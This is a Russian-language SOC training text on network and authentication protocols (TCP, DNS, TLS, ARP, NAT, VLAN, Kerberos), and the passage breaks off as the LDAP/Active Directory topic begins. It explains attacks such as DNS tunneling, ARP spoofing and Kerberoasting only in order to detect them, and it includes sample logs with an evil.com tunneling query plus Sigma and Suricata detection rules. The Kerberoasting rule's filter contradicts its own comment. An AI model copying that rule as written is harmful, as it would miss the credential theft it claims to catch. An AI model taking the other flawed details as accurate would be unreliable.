## Тема 1: Как работает TCP/IP

### Зачем это знать защитнику

TCP/IP — фундамент всех сетевых коммуникаций. SOC-аналитик ежедневно смотрит на TCP-соединения в логах IDS, SIEM и PCAP-файлах. Без понимания TCP невозможно отличить нормальный трафик от сканирования портов, SYN-флуда или попытки эксфильтрации данных.

### Простое объяснение (аналогия)

Представьте, что вы отправляете посылку через службу доставки. Перед отправкой вы звоните получателю: «Я хочу отправить посылку» (SYN). Получатель отвечает: «Хорошо, готов принять» (SYN-ACK). Вы подтверждаете: «Отлично, отправляю» (ACK). Это и есть «тройное рукопожатие» — три шага, после которых канал связи открыт. Если кто-то непрерывно звонит тысячам людей, но никогда не отправляет посылки — это SYN-флуд.

### Как это работает

**Модель TCP/IP** состоит из 4 уровней:

```
┌─────────────────────────────┐
│  4. Прикладной (Application) │  HTTP, DNS, SMTP, SSH
├─────────────────────────────┤
│  3. Транспортный (Transport)│  TCP, UDP
├─────────────────────────────┤
│  2. Сетевой (Internet)      │  IP, ICMP, ARP
├─────────────────────────────┤
│  1. Канальный (Link)        │  Ethernet, Wi-Fi
└─────────────────────────────┘
```

**TCP (Transmission Control Protocol)** — протокол транспортного уровня, обеспечивающий надёжную доставку данных. В отличие от UDP, TCP гарантирует, что все пакеты дойдут в правильном порядке.

**Тройное рукопожатие (3-Way Handshake):**

```
Клиент                          Сервер
  │                               │
  │──── SYN (seq=100) ──────────>│  Шаг 1: «Хочу соединиться»
  │                               │
  │<─── SYN-ACK (seq=300,        │  Шаг 2: «Согласен, я тоже готов»
  │      ack=101) ───────────────│
  │                               │
  │──── ACK (seq=101,            │  Шаг 3: «Подтверждаю, начинаем»
  │      ack=301) ──────────────>│
  │                               │
  │     [ Соединение установлено ]│
  │                               │
  │──── PSH,ACK (данные) ──────>│  Передача данных
  │<─── ACK ─────────────────────│  Подтверждение получения
  │                               │
  │──── FIN ────────────────────>│  Шаг закрытия: «Я закончил»
  │<─── FIN,ACK ─────────────────│  «Я тоже закончил»
  │──── ACK ────────────────────>│  «Принято, соединение закрыто»
  │                               │
```

**TCP-флаги и их значение для SOC:**

| Флаг | Назначение | Что это значит для SOC |
|------|-----------|----------------------|
| **SYN** | Инициация соединения | Массовые SYN без ACK = SYN-флуд или SYN-скан |
| **ACK** | Подтверждение | ACK на закрытые порты = ACK-скан (обход firewall) |
| **FIN** | Завершение | FIN на закрытые порты = FIN-скан (стелс-сканирование) |
| **RST** | Сброс соединения | Массовые RST = порт закрыт или firewall сбрасывает |
| **PSH** | Немедленная доставка | Нормально для данных, подозрительно без payload |
| **URG** | Срочные данные | Крайне редко в нормальном трафике, может быть evasion |
| **XMAS** | FIN+PSH+URG | Не бывает в нормальном трафике = XMAS-скан (Nmap) |
| **NULL** | Нет флагов | Не бывает в нормальном TCP = NULL-скан |

**Sequence Numbers (порядковые номера):** Каждый байт данных нумеруется. Сервер подтверждает получение, указывая следующий ожидаемый номер. Это позволяет TCP пересобирать пакеты в правильном порядке, даже если они приходят не по порядку. Для SOC это важно: некоторые атаки (evasion IDS) намеренно фрагментируют пакеты, рассчитывая, что IDS не сможет их правильно пересобрать.

**TCP Window Size:** Размер окна определяет, сколько данных можно отправить без подтверждения. Очень маленький window size (1-10 байт) в SYN — признак инструментов сканирования. Нормальные ОС используют window size от 8192 до 65535.

**Retransmissions (повторные передачи):** Если подтверждение не приходит вовремя, TCP повторяет отправку. Массовые retransmissions могут указывать на сетевые проблемы, DDoS или man-in-the-middle.

**В Wireshark:**

```
3    0.003    192.168.1.10  10.0.0.5      TCP       49152 → 443 [ACK] Seq=1 Ack=1
```


**Признаки аномалий в TCP:**
- Сотни SYN к разным портам одного хоста → сканирование портов
- Тысячи SYN к одному порту с разных IP → DDoS (SYN flood)
- SYN с нестандартным window size (например, 1024) → инструмент сканирования
- Пакеты с комбинацией FIN+PSH+URG (XMAS) → Nmap XMAS scan
- RST от хоста, который не отправлял SYN → RST injection / spoofing

### Типичные ошибки

1. **«Каждый SYN без ACK — это атака»** — Нет. SYN без ACK может быть из-за потери пакетов, таймаутов или нормального поведения (клиент передумал). Атака — это массовые SYN без ACK.
2. **«TCP гарантирует безопасность»** — TCP гарантирует надёжную доставку, НЕ безопасность. Данные передаются в открытом виде. Для безопасности нужен TLS поверх TCP.
3. **«Если соединение установлено, значит всё легитимно»** — Установленное TCP-соединение говорит только о сетевой доступности. Авторизация — задача прикладного уровня.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **3-Way Handshake** | Тройное рукопожатие: SYN → SYN-ACK → ACK для установки соединения |
| **Sequence Number** | Порядковый номер байта в потоке TCP |
| **Window Size** | Сколько данных можно отправить без подтверждения |
| **MSS** | Maximum Segment Size — максимальный размер TCP-сегмента |
| **RTT** | Round-Trip Time — время прохождения пакета туда и обратно |
| **Retransmission** | Повторная передача неподтверждённого сегмента |
| **Half-open connection** | Соединение после SYN, но до завершения handshake |
| **FIN scan** | Стелс-сканирование пакетами с флагом FIN |

## Тема 2: DNS изнутри

### Зачем это знать защитнику

DNS — один из самых эксплуатируемых протоколов. Практически любая сетевая атака в какой-то момент использует DNS: от C2-каналов (DNS tunneling) до генерации доменов (DGA) и перенаправления трафика (DNS hijacking). SOC-аналитик, который не умеет читать DNS-логи, пропускает критические индикаторы компрометации.

### Простое объяснение (аналогия)

DNS — это телефонная книга интернета. Когда вы набираете «google.com» в браузере, ваш компьютер не знает, по какому «адресу» находится Google. Он спрашивает DNS-сервер: «Какой IP у google.com?» И получает ответ: «142.250.74.14». Теперь представьте, что злоумышленник подменяет страницы в этой телефонной книге — вы набираете «банк.рф», но попадаете на поддельный сайт. Это DNS hijacking.

### Как это работает

**Типы DNS-запросов:**

```
Рекурсивный запрос (клиент → резолвер):
┌──────────┐                      ┌──────────────┐
│  Клиент  │─── "Какой IP у     ─>│ DNS-резолвер │
│ (браузер)│    example.com?"     │  (провайдер) │
│          │<── "93.184.216.34" ──│              │
└──────────┘                      └──────┬───────┘
                                         │
Итеративные запросы (резолвер ищет сам): │
                                         │
              ┌──────────────────────────┘
              │
              ▼
     ┌─────────────┐    "Спроси .com серверы"
     │ Root Server │────────────────────────┐
     │  (13 штук)  │                        │
     └─────────────┘                        ▼
                                   ┌─────────────────┐
                                   │ .com TLD Server  │
                                   │                  │──── "Спроси
                                   └─────────────────┘      ns1.example.com"
                                                               │
                                                               ▼
                                                    ┌──────────────────┐
                                                    │ Authoritative NS │
                                                    │  example.com     │
                                                    │ → 93.184.216.34  │
                                                    └──────────────────┘
```

**Типы DNS-записей:**

| Тип записи | Назначение | Пример | Для SOC |
|-----------|-----------|--------|---------|
| **A** | Имя → IPv4 | example.com → 93.184.216.34 | Основная запись, проверяйте подозрительные IP |
| **AAAA** | Имя → IPv6 | example.com → 2606:2800:... | IPv6 часто не мониторят — вектор обхода |
| **MX** | Почтовый сервер | example.com → mail.example.com | Фишинг-домены имитируют MX реальных доменов |
| **TXT** | Произвольный текст | SPF, DKIM, DMARC записи | DNS tunneling использует TXT для передачи данных |
| **CNAME** | Алиас (псевдоним) | www → example.com | Dangling CNAME = subdomain takeover |
| **NS** | Name Server | example.com → ns1.example.com | Смена NS = возможный DNS hijacking |
| **PTR** | Обратный DNS (IP → имя) | 93.184.216.34 → example.com | Несовпадение PTR и A = подозрительно |
| **SOA** | Start of Authority | TTL, серийный номер зоны | Аномально низкий TTL = возможная атака |

**TTL (Time To Live):** Время кеширования DNS-ответа в секундах. Нормальный TTL: 300–86400 секунд. Аномально низкий TTL (10–60 секунд) может указывать на fast-flux сети (быстрая смена IP для уклонения от блокировки) или DGA-домены.

**DNS как вектор атак (с точки зрения защитника):**

1. **DNS Tunneling** — передача данных через DNS-запросы. Атакующий кодирует данные в поддомен (например, `dGVzdA==.evil.com`). Длинные запросы, высокая частота, base64 в именах — признаки туннеля.

2. **DGA (Domain Generation Algorithm)** — малварь генерирует случайные домены (`aXk2mPq.com`, `bR9tZw3.net`). Если хотя бы один зарегистрирован атакующим — есть C2-канал. Признаки: высокая энтропия имени, NXDOMAIN на большинство запросов.

3. **DNS Cache Poisoning** — подмена записи в кеше резолвера. Клиент получает поддельный IP и идёт на сервер атакующего. Защита: DNSSEC.

4. **DNS Hijacking** — атакующий меняет NS-записи домена (через registrar или компрометацию DNS-сервера). Весь трафик домена уходит на серверы атакующего.

### Что видит SOC-аналитик

**В логах DNS-сервера / Zeek (dns.log):**
```
# Нормальный запрос:
1699000001.1  CHhJUP  192.168.1.10  53  google.com  A  NOERROR  142.250.74.14  300

# Подозрительный DNS tunneling:
1699000002.3  CQkR8z  192.168.1.50  53  dGVzdGRhdGFoZXJl.evil.com  TXT  NOERROR  -  60

# DGA-активность:
1699000003.5  CmN2a1  192.168.1.50  53  xk2mpq7r3t.com  A  NXDOMAIN  -  -
1699000003.6  CmN2a2  192.168.1.50  53  br9tzw3lm8.net  A  NXDOMAIN  -  -
1699000003.7  CmN2a3  192.168.1.50  53  qp5vhx9dc2.org  A  NXDOMAIN  -  -
```

**Sigma-правило для обнаружения DNS tunneling:**
```yaml
title: Подозрительно длинный DNS-запрос (возможный tunneling)
logsource:
    category: dns
detection:
    selection:
        query|re: '^.{50,}\.'  # Поддомен длиннее 50 символов
    condition: selection
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.004
```

### Типичные ошибки

1. **«DNS — безопасный протокол»** — DNS работает в открытом виде (порт 53/UDP). Любой на пути может видеть запросы. DoH (DNS over HTTPS) и DoT (DNS over TLS) решают это, но создают проблемы для мониторинга.
2. **«NXDOMAIN — это просто ошибка»** — Массовые NXDOMAIN от одного хоста — верный признак DGA-малвари.
3. **«Мониторинг DNS не нужен, если есть firewall»** — DNS почти всегда разрешён на firewall (порт 53). Именно поэтому он используется для C2 и эксфильтрации.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **Рекурсивный резолвер** | DNS-сервер, который ищет ответ за клиента, обходя всю цепочку |
| **Авторитативный NS** | DNS-сервер, хранящий оригинальные записи для зоны |
| **TTL** | Время жизни DNS-записи в кеше (секунды) |
| **NXDOMAIN** | Ответ «домен не существует» |
| **DGA** | Domain Generation Algorithm — алгоритм генерации доменов малварью |
| **Fast-flux** | Частая смена IP-адресов домена для уклонения от блокировки |
| **DNSSEC** | Расширение DNS для криптографической проверки ответов |
| **DoH/DoT** | DNS over HTTPS / DNS over TLS — шифрование DNS-запросов |

## Тема 3: Как работает HTTPS/TLS

### Зачем это знать защитнику

Более 90% веб-трафика зашифровано через TLS. SOC-аналитик должен понимать, что именно он может видеть в зашифрованном трафике (SNI, certificate, JA3/JA4), а что — нет. Многие C2-каналы используют HTTPS, и умение анализировать метаданные TLS-соединений — ключевой навык.

### Простое объяснение (аналогия)

Представьте, что вы хотите передать секретное сообщение другу через почту, но не уверены, что почтальон не прочитает. Вы договариваетесь: друг посылает вам открытый замок (публичный ключ), вы кладёте письмо в коробку и запираете его замком друга. Теперь только у друга есть ключ к этому замку (приватный ключ). Это и есть асимметричное шифрование. Но каждое письмо запирать замком — долго, поэтому в первом письме вы договариваетесь о общем «секретном слове» (сеансовый ключ), и дальше используете его — это быстрое симметричное шифрование.

### Как это работает

**TLS Handshake (TLS 1.3 — упрощённый):**

```
Клиент                                    Сервер
  │                                         │
  │──── ClientHello ──────────────────────>│
  │     - Поддерживаемые cipher suites      │
  │     - SNI: example.com                  │
  │     - Supported groups                  │
  │     - Key share (DH параметры)          │
  │                                         │
  │<─── ServerHello ──────────────────────│
  │     - Выбранный cipher suite            │
  │     - Key share (DH ответ)              │
  │     - {Certificate}                     │
  │     - {CertificateVerify}               │
  │     - {Finished}                        │
  │                                         │
  │──── {Finished} ───────────────────────>│
  │                                         │
  │     [ Зашифрованный обмен данными ]     │
  │<════ Application Data ════════════════>│
  │                                         │

{} = зашифровано сеансовым ключом
```

**Ключевые элементы TLS для SOC:**

**1. SNI (Server Name Indication)** — имя домена, отправленное в ClientHello в открытом виде. В TLS 1.3 это единственное, что SOC видит без расшифровки. ECH (Encrypted Client Hello) скрывает и SNI — тогда SOC теряет последний открытый индикатор.

**2. Certificate (сертификат)** — цифровой документ, подтверждающий подлинность сервера. Цепочка доверия: сертификат сервера → промежуточный CA → корневой CA (встроен в ОС/браузер).

```
┌──────────────────────┐
│  Корневой CA (Root)  │  Встроен в ОС / браузер
│  (GlobalSign, etc.)  │  Самоподписанный
└─────────┬────────────┘
          │ подписывает
          ▼
┌──────────────────────┐
│  Промежуточный CA    │  Выдаёт сертификаты
│  (Intermediate)      │  сайтам
└─────────┬────────────┘
          │ подписывает
          ▼
┌──────────────────────┐
│  Сертификат сервера  │  example.com
│  (End Entity)        │  Срок, домен, ключ
└──────────────────────┘
```

**3. Cipher Suite** — набор алгоритмов для шифрования. Пример: `TLS_AES_256_GCM_SHA384` означает: TLS 1.3, AES-256 в режиме GCM для шифрования, SHA-384 для хеширования.

**4. JA3/JA4 Fingerprint** — хеш параметров ClientHello (cipher suites, extensions, elliptic curves). Каждый клиент (браузер, малварь, инструмент) имеет уникальный JA3. Это позволяет SOC идентифицировать клиентское ПО без расшифровки трафика.

**Что SOC может видеть в зашифрованном HTTPS:**
- SNI (имя домена) — если не ECH
- IP-адреса клиента и сервера
- Размер и тайминг пакетов (traffic analysis)
- Сертификат сервера (в TLS 1.2; в TLS 1.3 зашифрован)
- JA3/JA4 fingerprint клиента
- Длительность соединения

**Что SOC НЕ может видеть:**
- URL-путь (только домен через SNI)
- HTTP headers (User-Agent, Cookie, etc.)
- Тело запроса/ответа
- Содержимое POST-форм

### Что видит SOC-аналитик

**В Zeek (ssl.log):**
```
1699000001.5  CxJ3b2  192.168.1.10  10.0.0.5  TLSv13  TLS_AES_256_GCM_SHA384
  server_name: suspicious-domain.xyz
  ja3: a0e9f5d64349fb13191bc781f81f42e1
  validation_status: self signed certificate
```

**Подозрительные индикаторы в TLS:**
- Самоподписанный сертификат (self-signed) — C2 серверы часто не используют Let's Encrypt
- Сертификат выдан менее 30 дней назад — фишинговые домены создаются быстро
- Несовпадение SNI и сертификата — возможный domain fronting
- Необычный JA3 — отличается от стандартных браузеров
- Длинные соединения с периодическим обменом малыми пакетами — beaconing

### Типичные ошибки

1. **«HTTPS = безопасно»** — HTTPS шифрует канал, но не гарантирует, что сервер легитимный. Фишинговые сайты тоже используют HTTPS (бесплатные сертификаты Let's Encrypt).
2. **«Нельзя ничего увидеть в зашифрованном трафике»** — Метаданные (SNI, JA3, тайминг, размер) дают много информации без расшифровки.
3. **«TLS 1.3 невозможно проксировать»** — TLS inspection (MITM-прокси) работает и с TLS 1.3, но требует установки корпоративного CA на все устройства.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **SNI** | Server Name Indication — имя домена в ClientHello |
| **Certificate Chain** | Цепочка сертификатов от сервера до корневого CA |
| **Cipher Suite** | Набор криптографических алгоритмов для сессии |
| **JA3/JA4** | Fingerprint клиента на основе параметров ClientHello |
| **HSTS** | HTTP Strict Transport Security — принудительный HTTPS |
| **Certificate Pinning** | Привязка сертификата к домену в клиенте |
| **ECH** | Encrypted Client Hello — шифрование SNI в TLS 1.3 |
| **TLS Inspection** | Расшифровка TLS-трафика корпоративным прокси |

## Тема 4: ARP и Layer 2 атаки

### Зачем это знать защитнику

ARP работает на канальном уровне и не имеет механизмов аутентификации. Это делает локальную сеть уязвимой для перехвата трафика (MiTM). SOC-аналитик должен уметь обнаруживать ARP-аномалии, особенно в корпоративных сетях, где внутренние угрозы — реальность.

### Простое объяснение (аналогия)

В офисе все общаются записками. Когда вам нужно отправить записку Ивану, вы кричите на весь офис: «У кого IP 10.0.0.5?» Иван отвечает: «Это я, мой MAC-адрес — AA:BB:CC:DD:EE:FF». Но что, если злоумышленник крикнет первым: «Это я! Мой MAC — 11:22:33:44:55:66»? Ваша записка уйдёт ему, а не Ивану. Это ARP spoofing.

### Как это работает

**ARP (Address Resolution Protocol)** — протокол для преобразования IP-адресов в MAC-адреса в локальной сети.

```
Шаг 1: ARP Request (широковещательный)
┌──────────┐    "Кто 10.0.0.5?     ┌──────────┐
│ Хост A   │──── Скажите свой  ────>│ ВСЕ хосты│
│ 10.0.0.1 │     MAC-адрес!"        │ в сети   │
│ AA:AA:..│                          └──────────┘
└──────────┘

Шаг 2: ARP Reply (одноадресный)
┌──────────┐    "10.0.0.5 — это я, ┌──────────┐
│ Хост B   │──── мой MAC: BB:BB:.."│ Хост A   │
│ 10.0.0.5 │                   ────>│ 10.0.0.1 │
│ BB:BB:..│                          └──────────┘

Шаг 3: Хост A записывает в ARP-таблицу:
  10.0.0.5 → BB:BB:BB:BB:BB:BB
```

**Проблема:** ARP не проверяет подлинность ответов. Любой хост может отправить gratuitous ARP (незапрошенный ответ), и все остальные обновят свои таблицы.

**ARP Spoofing / Poisoning:**

```
                   Атакующий
                  ┌──────────┐
                  │ 10.0.0.99│
                  │ CC:CC:.. │
                  └────┬─────┘
                       │
    Отправляет:        │       Отправляет:
    "10.0.0.1 = CC:CC" │       "10.0.0.5 = CC:CC"
    (подмена шлюза)    │       (подмена хоста B)
                       │
              ┌────────┴────────┐
              ▼                 ▼
        ┌──────────┐     ┌──────────┐
        │ Хост B   │     │  Шлюз    │
        │ 10.0.0.5 │     │ 10.0.0.1 │
        └──────────┘     └──────────┘

Результат: весь трафик между хостом B и шлюзом
проходит через атакующего (MiTM)
```

**Методы обнаружения и защиты:**

| Метод | Описание | Инструмент |
|-------|----------|-----------|
| **Dynamic ARP Inspection (DAI)** | Коммутатор проверяет ARP-ответы по DHCP snooping таблице | Cisco/HP switches |
| **ARP Watch** | Мониторинг изменений в ARP-таблице | arpwatch (Linux) |
| **Статические ARP-записи** | Фиксированные записи для критичных хостов (шлюз) | arp -s |
| **802.1X** | Аутентификация устройств перед подключением к сети | RADIUS + switch |
| **Port Security** | Ограничение MAC-адресов на порту коммутатора | Switch config |

### Что видит SOC-аналитик

**Алерт arpwatch:**
```
flip flop 10.0.0.1 AA:AA:AA:AA:AA:AA (old) → CC:CC:CC:CC:CC:CC (new)
```

**Suricata rule:**
```
alert arp any any -> any any (msg:"ARP Spoofing: duplicate IP with different MAC";
  arp_opcode:2; threshold:type both, track by_src, count 5, seconds 10;
  sid:2000001; rev:1;)
```

### Типичные ошибки

1. **«ARP-атаки невозможны в Wi-Fi»** — Wi-Fi тоже использует ARP. Любой в той же Wi-Fi сети может провести ARP spoofing.
2. **«Достаточно статического ARP на одном хосте»** — Нужно на всех критичных хостах, иначе другие останутся уязвимыми.
3. **«VLAN полностью защищает от ARP spoofing»** — VLAN ограничивает область атаки, но внутри одного VLAN ARP spoofing по-прежнему возможен.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **ARP** | Address Resolution Protocol — сопоставление IP → MAC |
| **Gratuitous ARP** | Незапрошенный ARP-ответ (обновление таблиц) |
| **ARP Cache** | Таблица соответствий IP → MAC на хосте |
| **DAI** | Dynamic ARP Inspection — проверка ARP на коммутаторе |
| **802.1X** | Стандарт аутентификации при подключении к сети |
| **MiTM** | Man-in-the-Middle — перехват трафика между двумя хостами |

## Тема 5: Как работает NAT и Firewall

### Зачем это знать защитнику

NAT и firewall — основные компоненты сетевого периметра. SOC-аналитик должен понимать, почему IDS может не видеть реальный source IP (из-за NAT), как stateful firewall отслеживает соединения, и как правильно читать логи firewall для расследования инцидентов.

### Простое объяснение (аналогия)

**NAT** — это секретарь в приёмной. Когда сотрудники (внутренние IP) отправляют письма наружу, секретарь ставит свой обратный адрес (внешний IP) и записывает, кому какое письмо. Когда приходит ответ — секретарь перенаправляет его нужному сотруднику.

**Firewall** — это охранник на входе. Stateless (без памяти) охранник проверяет каждого входящего по списку: «пропуск есть?». Stateful (с памятью) охранник помнит, кто вышел, и впускает обратно только тех, кто выходил.

### Как это работает

**Типы NAT:**

```
SNAT (Source NAT / Masquerade):
┌───────────┐                          ┌──────────┐
│ 192.168.1.10 │── src: 192.168.1.10 ──>│          │── src: 203.0.113.1 ──> Интернет
│ (клиент)  │   dst: 8.8.8.8          │   NAT    │   dst: 8.8.8.8
└───────────┘                          │  Router  │
┌───────────┐                          │          │
│ 192.168.1.20 │── src: 192.168.1.20 ──>│          │── src: 203.0.113.1 ──> Интернет
│ (клиент)  │   dst: 1.1.1.1          │          │   dst: 1.1.1.1
└───────────┘                          └──────────┘
                                       (один внешний IP)

DNAT (Destination NAT / Port Forwarding):
Интернет ── dst: 203.0.113.1:443 ──> NAT ── dst: 192.168.1.100:443 ──> Веб-сервер
```

**Проблема NAT для мониторинга:** Если IDS стоит за NAT, он видит только внешний IP. При инциденте нужно сопоставить NAT-логи с временем, чтобы найти реальный внутренний хост.

**Stateful vs Stateless Firewall:**

```
Stateless:                         Stateful:
┌─────────────────────┐           ┌─────────────────────┐
│ Правила:            │           │ Правила + таблица   │
│ ALLOW tcp dst:80    │           │ состояний:          │
│ ALLOW tcp src:80    │ ← нужно  │ ALLOW tcp dst:80    │
│ (для ответов!)      │   явно   │ (ответы автоматом!) │
│ DENY all            │           │ DENY all            │
└─────────────────────┘           └─────────────────────┘
                                  │ Connection table:    │
                                  │ 192.168.1.10:49152  │
                                  │  → 10.0.0.5:80      │
                                  │  state: ESTABLISHED  │
                                  └─────────────────────┘
```

**Connection Tracking (conntrack):** Stateful firewall ведёт таблицу всех соединений. Каждое соединение имеет состояние: NEW, ESTABLISHED, RELATED, INVALID. Это позволяет автоматически пропускать ответные пакеты без явных правил.

### Что видит SOC-аналитик

**Логи iptables:**
```
Nov 12 10:15:23 fw kernel: [BLOCK] IN=eth0 OUT= SRC=198.51.100.50 DST=203.0.113.1
  LEN=60 TTO=64 PROTO=TCP SPT=12345 DPT=22 SYN
```

**Логи NAT (для корреляции):**
```
Nov 12 10:15:00 nat: SNAT 192.168.1.42:55321 → 203.0.113.1:55321 → 8.8.8.8:443
```

### Типичные ошибки

1. **«Firewall = полная безопасность»** — Firewall фильтрует по портам/IP. Если порт 443 открыт, через него может идти C2-трафик, и firewall его не заблокирует.
2. **«NAT — это безопасность»** — NAT скрывает внутренние IP, но не является средством защиты. Это механизм экономии IPv4-адресов.
3. **«Если IDS стоит снаружи, он всё видит»** — IDS снаружи NAT видит внешний IP. IDS внутри NAT видит внутренний IP. Идеально иметь оба.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **SNAT** | Source NAT — подмена исходящего IP-адреса |
| **DNAT** | Destination NAT — перенаправление входящего трафика |
| **Masquerade** | Вариант SNAT с динамическим внешним IP |
| **Stateful Firewall** | Firewall, отслеживающий состояние соединений |
| **Conntrack** | Таблица отслеживания соединений в Linux |
| **DMZ** | Demilitarized Zone — сегмент для публичных серверов |

## Тема 6: VLAN и сетевая сегментация

### Зачем это знать защитнику

Сегментация сети — одна из главных мер защиты от lateral movement. Без VLAN атакующий, попавший на один хост, может свободно перемещаться по всей сети. SOC-аналитик должен понимать топологию VLAN, чтобы оценить масштаб инцидента и возможные пути распространения.

### Простое объяснение (аналогия)

Представьте офисное здание без стен — все сидят в одном большом зале. Если один сотрудник заболел, заражаются все. VLAN — это виртуальные стены: бухгалтерия в одной комнате, разработка в другой, серверная в третьей. Даже если вирус попал в бухгалтерию, он не доберётся до серверной без прохождения через «дверь» (маршрутизатор с ACL).

### Как это работает

**802.1Q Tagging:** Каждый Ethernet-кадр получает 4-байтовый тег с номером VLAN (1–4094). Коммутатор отправляет кадр только на порты с тем же VLAN ID.

```
Без VLAN:                        С VLAN:
┌─────────────────────┐         ┌─────────────────────┐
│     Один broadcast  │         │ VLAN 10  │ VLAN 20  │
│     домен на все    │         │ (Офис)   │ (Серверы)│
│     устройства      │         │          │          │
│  PC  PC  SRV  SRV  │         │ PC  PC   │ SRV  SRV │
│  (все видят всех)   │         │(изолир.) │(изолир.) │
└─────────────────────┘         └──────────┴──────────┘
                                      │ Маршрутизатор │
                                      │    с ACL      │
                                      └───────────────┘
```

**Типы портов коммутатора:**
- **Access port** — принадлежит одному VLAN, кадры без тега
- **Trunk port** — пропускает несколько VLAN, кадры с тегом 802.1Q

**VLAN Hopping (атака, от которой нужно защищаться):**
1. **Switch Spoofing** — атакующий прикидывается коммутатором и устанавливает trunk. Защита: отключить DTP (Dynamic Trunking Protocol) на всех access-портах.
2. **Double Tagging** — два 802.1Q тега; первый снимается коммутатором, второй переносит кадр в другой VLAN. Защита: native VLAN не должен использоваться для данных.

**Рекомендуемая сегментация:**

| VLAN | Назначение | Пример |
|------|-----------|--------|
| 10 | Пользователи (офис) | Рабочие станции |
| 20 | Серверы | Web, DB, App серверы |
| 30 | Управление (management) | Консоли коммутаторов, IPMI |
| 40 | DMZ | Публичные сервисы |
| 50 | Гостевой Wi-Fi | Изолированный интернет |
| 99 | Карантин | Заражённые хосты |

### Что видит SOC-аналитик

Межсегментный трафик проходит через маршрутизатор/firewall — и логируется. Трафик внутри VLAN — нет (если нет span/mirror). Поэтому правильная сегментация = больше видимости для SOC.

### Типичные ошибки

1. **«VLAN = firewall»** — VLAN изолирует на L2, но маршрутизатор между VLAN может пропускать всё без ACL.
2. **«Плоская сеть проще»** — Проще для администрирования, но катастрофически опасна: lateral movement без ограничений.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **VLAN** | Virtual LAN — виртуальная локальная сеть на коммутаторе |
| **802.1Q** | Стандарт тегирования VLAN-кадров |
| **Trunk** | Порт коммутатора, пропускающий несколько VLAN |
| **DTP** | Dynamic Trunking Protocol — автосогласование trunk (опасно!) |
| **ACL** | Access Control List — правила фильтрации на маршрутизаторе |
| **Microsegmentation** | Сегментация на уровне отдельных хостов/приложений |

## Тема 7: Kerberos аутентификация

### Зачем это знать защитнику

Kerberos — основной протокол аутентификации в Active Directory. Большинство атак на AD (Golden Ticket, Silver Ticket, Kerberoasting, AS-REP Roasting) эксплуатируют особенности Kerberos. SOC-аналитик ОБЯЗАН понимать, как работает Kerberos, чтобы обнаруживать эти атаки по Windows Event Logs.

### Простое объяснение (аналогия)

Представьте театр с гардеробом. Вы приходите и показываете паспорт кассиру (KDC). Кассир даёт вам «абонемент» (TGT — Ticket Granting Ticket). С абонементом вы подходите к любому залу и говорите: «Мне нужен билет на спектакль в зал 5» (TGS-REQ). Вам дают билет на конкретный спектакль (Service Ticket). На входе в зал проверяют только билет, а не паспорт.

Атака Golden Ticket — это подделка абонемента. Silver Ticket — подделка билета на конкретный спектакль.

### Как это работает

```
   Клиент                  KDC (DC)              Сервис
     │                       │                      │
     │ 1. AS-REQ             │                      │
     │ (логин, timestamp     │                      │
     │  зашифр. паролем)     │                      │
     │──────────────────────>│                      │
     │                       │                      │
     │ 2. AS-REP             │                      │
     │ (TGT зашифр.         │                      │
     │  ключом krbtgt)       │                      │
     │<──────────────────────│                      │
     │                       │                      │
     │ 3. TGS-REQ            │                      │
     │ (TGT + «хочу доступ  │                      │
     │  к FILE-SERVER»)      │                      │
     │──────────────────────>│                      │
     │                       │                      │
     │ 4. TGS-REP            │                      │
     │ (Service Ticket       │                      │
     │  зашифр. ключом       │                      │
     │  сервиса)             │                      │
     │<──────────────────────│                      │
     │                       │                      │
     │ 5. AP-REQ (Service Ticket)                   │
     │─────────────────────────────────────────────>│
     │                                              │
     │ 6. AP-REP (доступ предоставлен)              │
     │<─────────────────────────────────────────────│
```

**Ключевые атаки на Kerberos и как их обнаружить:**

| Атака | Что происходит | Детекция (Event ID) |
|-------|---------------|-------------------|
| **Golden Ticket** | Подделка TGT с помощью хеша krbtgt | 4769 с аномальным SID, TGT lifetime |
| **Silver Ticket** | Подделка Service Ticket с помощью хеша сервиса | 4769 без предшествующего 4768 |
| **Kerberoasting** | Запрос Service Ticket для SPN, оффлайн-взлом | 4769 с RC4 encryption (0x17) |
| **AS-REP Roasting** | Запрос AS-REP для аккаунта без preauth | 4768 с RC4 encryption для preauth-disabled |
| **DCSync** | Репликация NTDS.dit через DRSUAPI | 4662 с правами Replicating Directory Changes |

**Event IDs для мониторинга Kerberos:**
- **4768** — TGT запрошен (AS-REQ)
- **4769** — Service Ticket запрошен (TGS-REQ)
- **4771** — Kerberos pre-authentication failed
- **4770** — Service Ticket renewed

### Что видит SOC-аналитик

**Sigma-правило для Kerberoasting:**
```yaml
title: Kerberoasting — подозрительный запрос Service Ticket
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4 (слабое шифрование)
        ServiceName|endswith:
            - '$'  # не машинные аккаунты — они нормально используют RC4
    filter:
        ServiceName: 'krbtgt'
    condition: selection and not filter
level: high
```

### Типичные ошибки

1. **«Kerberos безопасен, потому что пароль не передаётся»** — Верно, но хеши паролей используются как ключи шифрования. Если хеш украден — аутентификация скомпрометирована.
2. **«Golden Ticket работает вечно»** — По умолчанию TGT живёт 10 часов. Но Golden Ticket может быть создан с произвольным сроком действия. Единственная защита — смена пароля krbtgt ДВАЖДЫ.
3. **«Достаточно мониторить Event ID 4769»** — Нужно смотреть на тип шифрования. RC4 (0x17) — подозрителен. AES (0x11/0x12) — нормален.

### Ключевые термины

| Термин | Значение |
|--------|----------|
| **KDC** | Key Distribution Center — сервис выдачи билетов (на DC) |
| **TGT** | Ticket Granting Ticket — «абонемент» для запроса Service Tickets |
| **Service Ticket** | Билет для доступа к конкретному сервису |
| **SPN** | Service Principal Name — уникальный идентификатор сервиса |
| **krbtgt** | Аккаунт, чей хеш шифрует все TGT в домене |
| **PAC** | Privilege Attribute Certificate — группы и права пользователя в билете |
| **Pre-authentication** | Проверка пароля перед выдачей TGT |

## Тема 8: LDAP и Active Directory

### Зачем это знать защитнику

Active Directory — центральная нервная система корпоративной Windows-сети. 95% атак на корпоративную инфраструктуру в конечном итоге нацелены на AD. SOC-аналитик должен знать структуру AD, чтобы понимать, что атакующий ищет и как обнаружить разведку внутри домена.

### Простое объяснение (аналогия)

